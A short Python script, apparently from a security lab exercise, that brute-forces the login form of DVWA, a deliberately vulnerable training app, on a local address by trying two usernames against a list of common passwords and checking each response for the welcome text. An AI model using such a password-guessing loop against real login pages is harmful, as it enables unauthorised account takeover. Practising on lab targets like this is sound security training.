import requests

user_list = ["root","admin"]
pass_list = ["password123","passwd","qwertyuıo","2211211","123456","asdsf","password","admin","pswd123456","pass111"]
header = {"Cookie": "security=low; PHPSESSID=ac798f9fb7d9f6d02ccccd01a42fad06"}

for username in user_list:
	for password in pass_list:
		url = "http://192.168.1.22/dvwa/vulnerabilities/brute/?username={}&password={}&Login=Login#".format(username,password)
		req = requests.get(url=url, headers=header)
		if "Welcome to the password protected area admin" in req.text:
			print(req.status_code,"--",req.headers["Content-length"],"--",username,":",password,"+")
		else:
			print(req.status_code,"--",req.headers["Content-length"],"--",username,":",password,"-")

